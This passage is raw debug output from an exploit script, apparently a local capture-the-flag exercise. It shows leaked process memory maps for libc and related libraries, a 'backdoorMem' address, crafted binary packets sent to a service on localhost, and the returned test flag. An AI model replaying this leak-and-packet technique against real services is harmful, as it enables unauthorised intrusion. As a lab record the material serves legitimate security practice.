    00000470  37 66 36 37  62 65 30 62  37 30 30 30  20 72 77 2d  │7f67│be0b│7000│ rw-│
    00000480  70 20 30 30  31 34 64 30  30 30 20 30  38 3a 30 35  │p 00│14d0│00 0│8:05│
    00000490  20 32 34 39  32 35 36 38  20 20 20 20  20 20 20 20  │ 249│2568│    │    │
    000004a0  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    000004b0  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    000004c0  78 2d 67 6e  75 2f 6c 69  62 6d 2d 32  2e 33 31 2e  │x-gn│u/li│bm-2│.31.│
    000004d0  73 6f 0a 37  66 36 37 62  65 30 62 37  30 30 30 2d  │so·7│f67b│e0b7│000-│
    000004e0  37 66 36 37  62 65 30 64  39 30 30 30  20 72 2d 2d  │7f67│be0d│9000│ r--│
    000004f0  70 20 30 30  30 30 30 30  30 30 20 30  38 3a 30 35  │p 00│0000│00 0│8:05│
    00000500  20 32 34 39  32 34 32 32  20 20 20 20  20 20 20 20  │ 249│2422│    │    │
    00000510  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    00000520  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    00000530  78 2d 67 6e  75 2f 6c 69  62 63 2d 32  2e 33 31 2e  │x-gn│u/li│bc-2│.31.│
    00000540  73 6f 0a 37  66 36 37 62  65 30 64 39  30 30 30 2d  │so·7│f67b│e0d9│000-│
    00000550  37 66 36 37  62 65 32 35  31 30 30 30  20 72 2d 78  │7f67│be25│1000│ r-x│
    00000560  70 20 30 30  30 32 32 30  30 30 20 30  38 3a 30 35  │p 00│0220│00 0│8:05│
    00000570  20 32 34 39  32 34 32 32  20 20 20 20  20 20 20 20  │ 249│2422│    │    │
    00000580  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    00000590  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    000005a0  78 2d 67 6e  75 2f 6c 69  62 63 2d 32  2e 33 31 2e  │x-gn│u/li│bc-2│.31.│
    000005b0  73 6f 0a 37  66 36 37 62  65 32 35 31  30 30 30 2d  │so·7│f67b│e251│000-│
    000005c0  37 66 36 37  62 65 32 39  66 30 30 30  20 72 2d 2d  │7f67│be29│f000│ r--│
    000005d0  70 20 30 30  31 39 61 30  30 30 20 30  38 3a 30 35  │p 00│19a0│00 0│8:05│
    000005e0  20 32 34 39  32 34 32 32  20 20 20 20  20 20 20 20  │ 249│2422│    │    │
    000005f0  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    00000600  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    00000610  78 2d 67 6e  75 2f 6c 69  62 63 2d 32  2e 33 31 2e  │x-gn│u/li│bc-2│.31.│
    00000620  73 6f 0a 37  66 36 37 62  65 32 39 66  30 30 30 2d  │so·7│f67b│e29f│000-│
    00000630  37 66 36 37  62 65 32 61  33 30 30 30  20 72 2d 2d  │7f67│be2a│3000│ r--│
    00000640  70 20 30 30  31 65 37 30  30 30 20 30  38 3a 30 35  │p 00│1e70│00 0│8:05│
    00000650  20 32 34 39  32 34 32 32  20 20 20 20  20 20 20 20  │ 249│2422│    │    │
    00000660  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    00000670  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    00000680  78 2d 67 6e  75 2f 6c 69  62 63 2d 32  2e 33 31 2e  │x-gn│u/li│bc-2│.31.│
    00000690  73 6f 0a 37  66 36 37 62  65 32 61 33  30 30 30 2d  │so·7│f67b│e2a3│000-│
    000006a0  37 66 36 37  62 65 32 61  35 30 30 30  20 72 77 2d  │7f67│be2a│5000│ rw-│
    000006b0  70 20 30 30  31 65 62 30  30 30 20 30  38 3a 30 35  │p 00│1eb0│00 0│8:05│
    000006c0  20 32 34 39  32 34 32 32  20 20 20 20  20 20 20 20  │ 249│2422│    │    │
    000006d0  20 20 20 20  20 20 20 20  20 20 20 20  2f 75 73 72  │    │    │    │/usr│
    000006e0  2f 6c 69 62  2f 78 38 36  5f 36 34 2d  6c 69 6e 75  │/lib│/x86│_64-│linu│
    000006f0  78 2d 67 6e  75 2f 6c 69  62 63 2d 32  2e 33 31 2e  │x-gn│u/li│bc-2│.31.│
    00000700  73 6f 0a 37  66 36 37 62  65 32 61 35  30 30 30 2d  │so·7│f67b│e2a5│000-│
    00000710  37 66 36 37  62 65 32 61  39 30 30 30  20 72 77 2d  │7f67│be2a│9000│ rw-│
    00000720  70 20 30 30  30 30 30 30  30 30 20 30  30 3a 30 30  │p 00│0000│00 0│0:00│
    00000730  20 30 20 0a  37 66 36 37  62 65 32 61  39 30 30 30  │ 0 ·│7f67│be2a│9000│
    00000740  2d 37 66 36  37 62 65 32  61 63 30 30  30 20 72 2d  │-7f6│7be2│ac00│0 r-│
    00000750  2d 70 20 30  30 30 30 30  30 30 30 20  30 38 3a 30  │-p 0│0000│000 │08:0│
    00000760  35 20 32 34  39 36 37 34  34 20 20 20  20 20 20 20  │5 24│9674│4   │    │
    00000770  20 20 20 20  20 20 20 20  20 20 20 20  20 2f 75 73  │    │    │    │ /us│
    00000780  72 2f 6c 69  62 2f 78 38  36 5f 36 34  2d 6c 69 6e  │r/li│b/x8│6_64│-lin│
    00000790  75 78 2d 67  6e 75 2f 6c  69 62 67 63  63 5f 73 2e  │ux-g│nu/l│ibgc│c_s.│
    000007a0  73 6f 2e 31  0a 37 66 36  37 62 65 32  61 63 30 30  │so.1│·7f6│7be2│ac00│
    000007b0  30 2d 37 66  36 37 62 65  32 62 65 30  30 30 20 72  │0-7f│67be│2be0│00 r│
    000007c0  2d 78 70 20  30 30 30 30  33 30 30 30  20 30 38 3a  │-xp │0000│3000│ 08:│
    000007d0  30 35 20 32  34 39 36 37  34 34 20 20  20 20 20 20  │05 2│4967│44  │    │
    000007e0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 2f 75  │    │    │    │  /u│
    000007f0  73 72 2f 6c  69 62 2f 78  38 36 5f 36  34 2d 6c 69  │sr/l│ib/x│86_6│4-li│
    00000800  6e 75 78 2d  67 6e 75 2f  6c 69 62 67  63 63        │nux-│gnu/│libg│cc│
    0000080e
[*] backdoorMem:0x8999000
[DEBUG] Sent 0x17 bytes:
    00000000  02 fd 80 01  00 00 00 0f  00 01 01 00  3d 14 08 87  │····│····│····│=···│
    00000010  60 00 04 ef  be ad de                               │`···│···│
    00000017
[DEBUG] Received 0x16 bytes:
    00000000  02 fd 80 01  00 00 00 0e  01 00 00 01  7d 44 08 87  │····│····│····│}D··│
    00000010  60 00 00 00  00 04                                  │`···│··│
    00000016
[DEBUG] Sent 0x10 bytes:
    00000000  02 fd 80 01  00 00 00 08  00 01 01 00  31 01 ba c4  │····│····│····│1···│
    00000010
[*] Switching to interactive mode
[DEBUG] Received 0x13 bytes:
    'flag{this_is_test}\n'
flag{this_is_test}
[DEBUG] Received 0xf bytes:
    00000000  02 fd 80 01  00 00 00 07  01 00 00 01  7f 31 10     │····│····│····│·1·│
    0000000f
�\x07\x00\x7f1\x10$
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 13400
```

